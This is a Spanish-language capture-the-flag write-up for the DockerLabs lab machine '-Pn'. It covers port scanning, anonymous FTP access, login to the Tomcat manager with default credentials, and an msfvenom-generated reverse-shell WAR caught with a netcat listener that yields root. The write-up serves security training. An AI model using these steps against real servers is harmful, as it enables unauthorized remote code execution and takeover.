# [-Pn](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash auto_deploy.sh pn.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).


## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)
<br>
`-c 1` ⮞ solo lo repite una vez<br>
<br>

Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
<br>

Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que está abierto el puerto **21** y **8080**.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/44f6d073-52a3-4b3c-9dee-cef94ebe4edc)

<br>

Al ver que está abierto el puerto FTP vamos ha hacer un escaneo de nmap pero para que nos liste más información. Para llevar a cabo eso debemos hacer ```nmap -p21 -sCV 172.17.0.2 -oN targeted``` <br>
`-p21` ⮞ aplicar el escaneo solo al puerto 21 >
`-sC` ⮞ ejecuta los scripts de reconocimiento básico, los más comunes <br> 
`-sV` ⮞ para conocer la versión del servicio que corre por el puerto (se puede juntar con el anterior y quedaría así `-sCV`)<br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-oN` ⮞ lo exporta en formato nmap al archivo targeted
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/530c86d6-efde-4e04-8be6-468d27df3b57)

<br>
<br>


## FTP (Puerto 21)

Una vez ya conozcamos que la versión del ftp es vulnerable al login como `anonymous`, por lo que nos logeamos como este de la siguiente forma `ftp 172.17.0.2` poniendo `anonymous` como login y contraseña, y vemos que tiene un archivo llamado `tomcat.txt`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/24e78158-d66b-49b7-b739-85c760917b1b)
<br>

Nos lo guardamos en nuestra máquina con `get tomcat.txt` por si nos hiciera falta más adelante.

<br>

Vemos el contenido del archivo con `cat tomcat.txt`, y bueno tenemos un posible usuario llamado `tomcat`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/cae42bee-ed28-4526-9959-14646212a510)

<br>
<br>


## Página Web (Puerto 8080)

Al ver que aloja un servidor web, nos dirigimos a él poniendo en el buscador la ip que en este caso sería `172.17.0.2:8080`. Observamos que en dicho servidor web se aloja un `Apache TomCat 9.0.88` .
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/20aee9e5-5540-40ff-9183-d5fd4f7a5523)

<br>

Si echamos un vistazo por la página vemos en el siguiente recuadro amarillo, un link para acceder al `manager webapp`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/0643d2b1-75b7-4a83-a1e2-d48b012731eb)
<br>

Si pinchamos nos sale lo siguiente:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/95018d56-5ceb-4855-8af6-6f901c543f94)

<br>

Si buscamos en páginas como [Hacktricks](https://book.hacktricks.xyz/v/es), por la credenciales por defecto de Apache Tomcat nos encontraremos con algo parecido a esto:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/730fc856-9dc1-42f6-98f4-ac529d53ef09)

<br>

Probamos las credenciales que aparecen ahí, y las que funcionan son las de `tomcat:s3cr3t`, como bien habiamos encontrado en el fichero (`tomcat.txt`) del servidor ftp, existía un usuario `tomcat`.

<br>

Ahora nos encontramos con el panel de admin de apache, que tiene esta pinta:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/e4b9ae3f-4d5b-47aa-9482-236d27a64b48)

<br>

Ahora lo que debemos hacer es buscar alguna manera de intentar entrar en la máquina `-Pn`, en la misma página de [Hacktricks](https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/tomcat) donde he encontrado las credenciales por defecto más abajo nos menciona una RCE si tienes acceso al panel de Administrador que es justo lo que hemos conseguido: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/47253580-fa7f-4875-94cd-110ba95b69d3)

<br>

Nos dice que tenemos que subir un archivo `.war`, para ello usaremos `msfvenom` como bien nos indica la página de [Hacktricks](https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/tomcat) con el siguiente comando: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war`. <br>
`-p` ⮞ le especificamos el payload a usar <br>
`LHOST` ⮞ nuestra dirección ip <br> 
`LPORT` ⮞ nuestro puerto por el cual nos pondremos en escucha <br>
`-f` ⮞ formato para exportar el payload <br> 
`-o` ⮞ guardar el payload en un archivo 

<br>

Observamos que se nos ha generado el archivo con el cual nos mandaremos una reverse shell:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/9b8d56e1-0948-48ab-aef3-634c4eb15c83)

<br>

En primer lugar, nos pondremos en escucha por el puerto especificado, en este caso el `443` con el siguiente comando `nc -nlvp 443`.

<br>

En segundo lugar, subiremos el archivo `revshell.war` al Panel de Administrador de Tomcat en el apartado que dice `WAR file to deploy`:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/c3bf91d8-afb9-4d55-9a24-37c3b158f50f)

<br>

Nos dice que se ha subido correctamente, comprobamos que el archivo se encuentra en esta tabla:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/75c1bbf3-54ae-436d-b049-4090c98d4ca4)

<br>

Una vez que le hemos dado click recibiremos la revshell, por el puerto que nos habiamos puesto en escucha
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/dd9d2610-8a55-4aa1-bf94-4ca85f876aa6)

<br>
<br>

## Escalada de Privilegios

No es necesario el tratamiento de la TTY, pero si queremos hacer alguna prueba con dicha máquina, debéis aplicar el siguiente tratamiento de la TTY:<br>
1-.`script /dev/null -c bash` <br>
2-.`Pulsamos CTRL+Z` <br>
3-.`stty raw -echo; fg` <br>
4-.`reset xterm` <br>
5-.`export SHELL=bash && export TERM=xterm` <br>

No hará falta la escalar privilegios ya que hemos accedido directamente a la máquina víctima `-Pn` como el usuario **root**:
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/427ecc79-24bd-4386-bc92-afdc4f7dc51e)

 > El (;) concatena dos comandos.
